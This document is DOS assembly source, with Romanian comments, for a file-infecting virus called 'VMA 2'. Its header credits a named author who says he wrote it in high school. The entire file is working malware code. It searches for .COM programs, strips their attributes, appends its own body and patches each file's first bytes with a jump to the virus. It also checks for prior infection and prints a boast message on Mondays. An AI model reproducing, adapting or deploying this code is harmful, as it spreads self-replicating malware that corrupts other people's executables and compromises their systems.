; ==============================================================
; = Nume    : Virus VMA 2                                      =
; = Autor   : Marian Veteanu                                   =
; = Actiune : Infesteaza fisierele .COM                        =
; = Efect   : Nu produce prea mari pagube !                    =
; = Nota    : Acest virus l-am creat de pe vremea cand eram la =
; =           liceu ( liceul Nicolae Balcescu din Pitesti )    =
; ==============================================================

; Este foarte, foarte NEoptimizat !

lungime equ ((offset sfirsit)-(offset entry))
.model tiny
.code
org 100h
entry: call entr                                ; afla in BP adresa virusului
entr   proc near
       pop bp
       sub bp,3
       mov byte ptr [cale+2-entry+bp],'C'

       mov cx,5                                 ; salveaza primii 5 bytes
       mov si,offset header-entry               ; in memorie
       add si,bp
       mov di,offset horig-entry
       add di,bp
       rep movsb

          mov ah,2ah
          int 21h
          cmp al,1                               ; afiseaza mesajul lunea
          jnz urmat
          mov ah,9
          mov dx,offset mesaj-entry
          add dx,bp
          int 21h


urmat: mov ah,1ah                               ; seteaza DTA
       mov dx,offset dta-entry
       add dx,bp
       int 21h

       mov ah,4eh                               ; cauta primul fisier .COM
       mov dx,offset cale-entry
       add dx,bp
       mov cx,2
       int 21h
       jc next

open:  mov ax,4300h                             ; salveaza atributele fis gasit
       mov dx,1eh+offset dta-entry
       add dx,bp
       int 21h
       mov atrib,cx

       mov ax,4301h                             ; sterge atributele fis gasit
       xor cx,cx
       mov dx,1eh+offset dta-entry
       add dx,bp
       int 21h

       mov ax,3d02h                             ; deschide fis in mod R/W
       mov dx,1eh+offset dta-entry
       add dx,bp
       int 21h
next:  jc next2

       mov bx,ax                                ; citeste primii 5 bytes
       mov dx,offset header-entry               ; din fisierul gasit
       add dx,bp
       mov cx,5
       mov ah,3fh
       int 21h
       jc close

       mov ax,0e2ffh                            ; verifica daca este deja virusat
       cmp word ptr [header-entry+3+bp],ax
       jz close

       mov ax,4202h                             ; afla lungimea fisierului
       xor cx,cx
       xor dx,dx
       int 21h
       jc close
       add ax,256
       mov cs:(offset hnou+1-entry)[bp],ax

       mov dx,bp                                ; scrie virusul la sfirsitul
       mov cx,lungime                           ; fisierului
       mov ah,40h
       mov byte ptr [cale+2-entry+bp],'R'
       int 21h
       jc close

       mov ax,4200h                             ; pozitioneaza pointerul
       xor cx,cx                                ; la inceputul fisierului
       xor dx,dx
       int 21h
       jc close

       mov dx,offset hnou-entry                 ; scrie 'JMP' spre virus
       add dx,bp
       mov cx,5
       mov ah,40h
       int 21h

close: mov ah,3eh                               ; inchide noul fisier virusat
       int 21h

       mov cx,atrib                             ; reface atributele fisierului
       mov ax,4301h
       mov dx,1eh+offset dta-entry
       add dx,bp
       int 21h


next2: jc retu

       mov ah,4fh                               ; cauta urmatorul fisier .COM
       int 21h
       jc retu
       jmp open


retu:  mov cx,5                                 ; reface in memorie
       mov si,offset horig-entry                ; primii 5 bytes
       add si,bp
       mov di,100h
       rep movsb
       mov dx,100h                              ; preda controlul prog. original
       push dx
       retn

cale   db '*.ROM',0
atrib  dw 0
mesaj  db 13,10,'   Your computer has now VMA2 virus !!!',13,10,'$'
header db 0C3h,0C3h,0C3h,0C3h,0C3h
hnou   db 0BAh,0,0,0FFh,0E2h                    ; mov dx,?? jmp dx
horig  db 5 dup (0)
dta    db 43 dup (0)

sfirsit:
entr   endp
end    entry
